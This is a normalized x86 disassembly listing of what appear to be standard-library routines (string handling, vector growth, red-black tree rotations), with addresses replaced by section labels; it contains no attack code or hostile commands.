jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov edx ebx
mov edx [ ebx ]
jmp r-xdata
mov [ ebx + edi ] 0x0
mov ebx [ ebx ]
mov ecx [ esi + 0x14 ]
push ebp
mov ebp [ esp + 0x18 ]
sub eax ecx
push ebp
push eax
add ecx edx
push ecx
call sub_40f306
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_409850
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov esi ecx
test ebp ebp
je r-xdata
mov edi [ esp + 0x14 ]
cmp edi 0xfffffffe
jbe r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_40e13b
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x14 ]
push edx
push edi
mov ecx esi
call sub_40a700
test edi edi
cmp edx 0x10
jb r-xdata
cmp ebp ecx
jb r-xdata
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x14 ]
add edi ecx
cmp edi ebp
jbe r-xdata
mov [ ebx + edi ] 0x0
pop ebx
mov ebx [ ebx ]
push edi
push ebp
push ecx
push eax
call sub_40f306
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
sub ebp eax
push ebp
push esi
mov ecx esi
call sub_408b10
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ eax ]
sub_409930
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov eax [ esi + 0x14 ]
mov edi [ esp + 0x14 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_40e173
test edi edi
jbe r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
mov ecx [ esi + 0x18 ]
push ebp
lea ebp [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ esp + 0x14 ] ebp
mov edx [ ebp ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov edx ebp
mov edx [ ebp ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov [ eax + ebp ] 0x0
pop ebp
mov ebp [ ebp ]
sub eax edi
push eax
mov eax [ esp + 0x18 ]
add eax ebx
add eax edi
push eax
sub ecx ebx
push ecx
add edx ebx
push edx
call sub_40e1ef
mov eax [ esi + 0x14 ]
sub eax edi
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] eax
jb r-xdata
sub_4099e0
push ebp
mov ebp esp
push 0xffffffff
push sub_421150
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ rw-data ]
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
inc eax
cmp esi eax
jae r-xdata
call sub_409cf0
mov edi [ rw-data ]
mov ecx edi
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0xaaaaaaa
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x2aaaaaab
imul edi
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
mov ecx esi
shr ecx 0x1
mov edx 0xaaaaaaa
sub edx ecx
cmp edx esi
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x50 ]
push eax
call sub_408560
mov [ ebp - 0x4 ] 0x5
mov esi [ rw-data ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
lea edi [ esi - 0x18 ]
push esi
push esi
mov ecx edi
call sub_40b460
mov [ rw-data ] eax
mov eax edi
mov edi [ ebp + 0x10 ]
push esi
call sub_40aea0
mov esi [ ebp + 0x10 ]
lea edi [ esi + 0x18 ]
add esp 0x14
cmp esi edi
je r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_408560
mov edi 0x2
mov [ ebp - 0x4 ] edi
mov ecx [ ebp + 0x10 ]
mov [ ebp + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
lea eax [ ecx + 0x18 ]
push edx
push eax
mov eax [ rw-data ]
push eax
call sub_40b460
mov [ ebp - 0x4 ] 0x3
mov esi [ rw-data ]
mov ecx esi
sub ecx [ ebp + 0x10 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ ebp + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx 0x1
sub ecx edx
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x38 ]
push eax
push esi
call sub_40af80
mov [ ebp - 0x4 ] edi
mov eax [ rw-data ]
mov esi [ ebp + 0x10 ]
add eax 0x18
lea edi [ eax - 0x18 ]
add esp 0x20
mov [ rw-data ] eax
cmp esi edi
je r-xdata
add esi ecx
xor esi esi
jmp r-xdata
lea esi [ ebp - 0x50 ]
push esi
lea eax [ ebp - 0x50 ]
call sub_40b170
add esi 0x18
cmp esi edi
jne r-xdata
lea esi [ ebp - 0x38 ]
jmp r-xdata
lea esp [ esp ]
mov ecx esi
call sub_409d70
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp - 0x20 ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
push eax
call sub_40b460
mov edx [ ebp + 0x8 ]
add esp 0x10
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp - 0x20 ]
push ecx
mov edi eax
mov eax [ ebp + 0x8 ]
push edx
push eax
push edi
mov ecx 0x1
mov [ ebp - 0x18 ] edi
call sub_40af80
mov eax [ rw-data ]
add esp 0x10
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
add edi 0x18
push edi
push eax
mov [ ebp - 0x18 ] edi
call sub_40b460
mov edi [ rw-data ]
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add esp 0x10
lea ebx [ edx + ecx + 0x1 ]
test edi edi
je r-xdata
mov esi eax
cmp esi eax
jae r-xdata
call sub_408670
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
lea eax [ ebp - 0x38 ]
call sub_40b170
add esi 0x18
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x1c ]
lea edx [ esi + esi * 2 ]
lea ecx [ eax + edx * 8 ]
lea edx [ ebx + ebx * 2 ]
mov [ rw-data ] ecx
lea ecx [ eax + edx * 8 ]
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x8 ]
mov eax [ rw-data ]
push edx
push eax
mov eax edi
call sub_40b0b0
mov ecx [ rw-data ]
push ecx
call sub_40f2fb
add esp 0xc
sub_409cf0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_420a78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
push 0x12
push r--data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
call sub_409850
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5c ] 0x0
call sub_4010d0
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_41070b
int3
sub_409d70
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x18
jae r-xdata
xor ecx ecx
lea edx [ ecx + ecx * 2 ]
add edx edx
add edx edx
add edx edx
push edx
call sub_40fd2d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_40e7e0
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_41070b
int3
sub_409dd0
sub esp 0x8
mov ecx [ rw-data ]
push ebx
push ebp
mov eax 0x9249249
mov edx 0x1
sub eax ecx
push esi
push edi
mov [ esp + 0x10 ] edx
cmp eax edx
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
call sub_40a870
cmp eax 0x1
jbe r-xdata
mov eax 0x8
jmp r-xdata
mov ebx [ rw-data ]
add ecx edx
call sub_40a8f0
mov ecx [ rw-data ]
mov [ esp + 0x14 ] eax
lea esi [ ebx * 4 ]
lea edi [ esi + eax ]
mov eax [ rw-data ]
add eax eax
add eax eax
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
sar eax 0x2
lea ecx [ eax * 4 ]
lea ebp [ ecx + edi ]
test eax eax
jbe r-xdata
mov esi 0x9249249
sub esi eax
cmp ecx esi
ja r-xdata
mov eax [ esp + 0x10 ]
cmp ebx eax
ja r-xdata
push ecx
push edx
push ecx
push edi
call sub_40e1ef
add esp 0x10
mov edx eax
mov [ esp + 0x10 ] eax
lea ebx [ eax * 4 ]
mov eax ebx
sar eax 0x2
test eax eax
jbe r-xdata
sar esi 0x2
lea eax [ esi * 4 ]
lea edi [ eax + ebp ]
test esi esi
jbe r-xdata
mov eax [ rw-data ]
lea ecx [ ebx + eax ]
mov ebx [ esp + 0x14 ]
sub esi ecx
add esi eax
sar esi 0x2
lea eax [ esi * 4 ]
lea ebp [ eax + ebx ]
test esi esi
jbe r-xdata
mov edx [ rw-data ]
add eax eax
add eax eax
push eax
push edx
push eax
push ebp
call sub_40e1ef
add esp 0x10
mov ecx [ esp + 0x10 ]
sub ecx ebx
je r-xdata
mov ecx [ rw-data ]
push eax
push ecx
push eax
push ebp
call sub_40e1ef
add esp 0x10
mov ecx [ esp + 0x10 ]
test ecx ecx
jbe r-xdata
push eax
push ecx
push eax
push ebx
call sub_40e1ef
add esp 0x10
test ebx ebx
jbe r-xdata
xor eax eax
[ edi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
mov edi ebp
[ edi ]
jmp r-xdata
mov ebx [ esp + 0x14 ]
mov ecx ebx
mov ebx [ esp + 0x14 ]
xor eax eax
mov edi ebx
[ edi ]
jmp r-xdata
mov eax [ esp + 0x10 ]
add [ rw-data ] eax
pop edi
pop esi
pop ebp
mov [ rw-data ] ebx
pop ebx
add esp 0x8
retn
push eax
call sub_40f2fb
add esp 0x4
sub_409f50
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1c
jae r-xdata
xor ecx ecx
lea edx [ ecx * 8 ]
sub edx ecx
add edx edx
add edx edx
push edx
call sub_40fd2d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_40e7e0
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_41070b
int3
sub_409fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_420f60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x5c ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x54 ] esi
test eax eax
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add ebx edx
xor ebx ebx
jmp r-xdata
inc eax
cmp ebx eax
jae r-xdata
call sub_40a2e0
mov edi [ esi + 0x10 ]
mov ecx edi
sub ecx [ esi + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0x9249249
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov edx [ ebp - 0x5c ]
push edx
cmp ecx 0x1
jae r-xdata
mov ecx ebx
shr ecx 0x1
mov edx 0x9249249
sub edx ecx
cmp edx ebx
jae r-xdata
lea ecx [ ebp - 0x4c ]
call sub_408340
mov [ ebp - 0x4 ] 0x5
mov edi [ esi + 0x10 ]
mov [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push eax
push ecx
lea ebx [ edi - 0x1c ]
push edi
mov edx edi
mov ecx ebx
call sub_40b590
mov [ esi + 0x10 ] eax
mov eax ebx
mov ebx [ ebp + 0x10 ]
add esp 0xc
call sub_40af10
mov eax [ ebp + 0x10 ]
lea edi [ eax + 0x1c ]
lea ebx [ ebp - 0x4c ]
call sub_40aef0
mov ecx ebx
lea ecx [ ebp - 0x30 ]
call sub_408340
mov ebx 0x2
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x50 ] 0x0
mov edi [ ebp - 0x50 ]
push edi
mov edi [ ebp - 0x50 ]
push edi
lea edx [ ecx + 0x1c ]
push eax
call sub_40b590
mov [ ebp - 0x4 ] 0x3
mov edi [ esi + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
push edx
mov ecx 0x1
sub ecx eax
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x30 ]
push edx
push edi
call sub_40b010
mov [ ebp - 0x4 ] ebx
add [ esi + 0x10 ] 0x1c
mov esi [ esi + 0x10 ]
mov eax [ ebp + 0x10 ]
add esp 0x10
lea edi [ esi - 0x1c ]
lea ebx [ ebp - 0x30 ]
call sub_40aef0
mov ecx ebx
jmp r-xdata
add ebx ecx
xor ebx ebx
jmp r-xdata
call sub_408370
mov ecx ebx
call sub_409f50
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0xc ]
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] eax
call sub_40b590
mov edx [ ebp - 0x5c ]
mov edi eax
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push eax
push ecx
push edx
push edi
mov ecx 0x1
mov [ ebp - 0x58 ] edi
call sub_40b010
mov eax [ esi + 0x10 ]
add esp 0x10
mov [ ebp - 0x50 ] 0x0
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
add edi 0x1c
push eax
mov edx edi
mov [ ebp - 0x58 ] edi
call sub_40b590
mov edi [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add esp 0xc
lea edx [ edx + eax + 0x1 ]
mov [ ebp - 0x50 ] edx
test edi edi
je r-xdata
mov ebx eax
cmp ebx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
lea ecx [ ebx * 8 ]
sub ecx ebx
lea ecx [ eax + ecx * 4 ]
mov [ esi + 0x14 ] ecx
lea ecx [ edx * 8 ]
sub ecx edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x10 ] edx
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x50 ]
mov edi [ esi + 0x10 ]
mov eax [ esi + 0xc ]
push ecx
call sub_40b130
mov edx [ esi + 0xc ]
add esp 0x4
push edx
call sub_40f2fb
mov edx [ ebp - 0x50 ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40e1e0
mov esp ebp
pop ebp
retn 0xc
sub_40a2e0
push 0xffffffff
push sub_420a48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
push 0x12
push r--data
lea ecx [ esp + 0xc ]
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
call sub_409850
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x54 ] 0x0
call sub_4010d0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] r--data
call sub_41070b
int3
sub_40a360
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
push edi
mov edi [ eax ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
call sub_40ee1a
mov eax [ esp + 0x20 ]
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
mov ebx [ esp + 0x28 ]
mov edi [ esi + 0x18 ]
mov edx [ esi ]
test ebx ebx
je r-xdata
mov ecx [ esp + 0x24 ]
cmp ecx edi
jne r-xdata
call sub_40ee1a
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
cmp eax [ esp + 0x28 ]
je r-xdata
call sub_40ee1a
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
cmp ebx edx
je r-xdata
mov esi [ esi ]
pop edi
mov [ ebp ] esi
pop esi
mov eax ebp
mov [ ebp + 0x4 ] ecx
pop ebp
pop ebx
add esp 0x8
retn 0x14
mov edi eax
mov ebx ecx
test eax eax
jne r-xdata
cmp ecx [ esp + 0x2c ]
je r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx esi
call sub_409280
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
mov edx [ esi ]
mov [ ebp ] edx
mov eax ebp
mov [ ebp + 0x4 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x14
cmp [ esp + 0x2c ] edi
jne r-xdata
cmp [ ecx + 0x45 ] 0x0
je r-xdata
call sub_40ee1a
mov ecx [ esp + 0x24 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
call sub_40ee1a
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
jne r-xdata
push ebx
push edi
lea eax [ esp + 0x18 ]
push eax
push esi
call sub_40a950
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
jmp r-xdata
mov [ esp + 0x24 ] eax
nop
mov [ esp + 0x24 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov ecx eax
mov [ esp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
sub_40a4b0
sub esp 0x10
mov eax [ eax + 0x18 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x45 ] 0x0
mov [ esp + 0x8 ] eax
jne r-xdata
pop ebx
add esp 0x10
retn
mov eax [ ecx + 0x14 ]
mov edx [ ecx + 0x18 ]
push ebp
push esi
add ecx 0x4
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] edx
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov edi 0x10
cmp [ esp + 0x1c ] edi
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov esi ebp
cmp ebp eax
jb r-xdata
mov ebp [ ebx + 0x20 ]
mov ecx ebp
cmp ecx ebp
jae r-xdata
cmp [ ebx + 0x24 ] edi
jb r-xdata
mov esi eax
lea edi [ ebx + 0x10 ]
mov edi [ ebx + 0x10 ]
jmp r-xdata
test esi esi
je r-xdata
lea ebx [ ebx ]
cmp esi 0x4
jb r-xdata
xor ecx ecx
movzx ecx [ edi ]
movzx eax [ edx ]
sub ecx eax
jne r-xdata
sub esi 0x4
add edx 0x4
add edi 0x4
cmp esi 0x4
jae r-xdata
jge r-xdata
cmp ebp eax
jb r-xdata
mov eax [ esp + 0x10 ]
sar ecx 0x1f
or ecx 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov ecx [ edi ]
cmp ecx [ edx ]
jne r-xdata
mov [ esp + 0x14 ] ebx
mov ebx [ ebx ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
cmp ebp eax
setne cl
test ecx ecx
test ecx ecx
jne r-xdata
mov eax [ esp + 0x10 ]
movzx ecx [ edi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub ecx eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
cmp [ ebx + 0x45 ] 0x0
je r-xdata
cmp esi 0x2
jbe r-xdata
movzx ecx [ edi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub ecx eax
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx ecx [ edi + 0x3 ]
movzx edx [ edx + 0x3 ]
sub ecx edx
sub_40a5c0
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_40a610
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_40a660
push ebp
mov ebp esp
push 0xffffffff
push sub_4208c5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x48
call sub_40fd2d
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi ] eax
lea eax [ esi + 0xc ]
push eax
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edx
call sub_40ad30
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x45 ] 0x0
sub_40a700
push ebp
mov ebp esp
push 0xffffffff
push sub_420810
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x18 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp edx ecx
jae r-xdata
mov esi eax
jmp r-xdata
xor ebx ebx
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] ebx
cmp ecx ebx
ja r-xdata
mov eax 0xfffffffe
sub eax ecx
cmp ebx eax
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
lea esi [ ecx + ebx ]
push ecx
call sub_40fd2d
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ebx
call sub_40e7e0
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_41070b
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40adb0
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
mov ebx [ ebp + 0xc ]
test ebx ebx
jbe r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov [ eax ] 0x0
mov [ eax ] ecx
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ebx
cmp esi 0x10
jb r-xdata
mov edx [ edi + 0x4 ]
push edx
call sub_40f2fb
add esp 0x4
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov [ eax + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ecx
mov ecx [ ebp + 0x8 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
push ecx
call sub_40f306
add esp 0x10
sub_40a83e
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push 0x0
mov [ esi + 0x4 ] 0x0
call sub_41070b
int3
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
sub_40a870
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_420a78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
push 0x11
push r--data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0xf
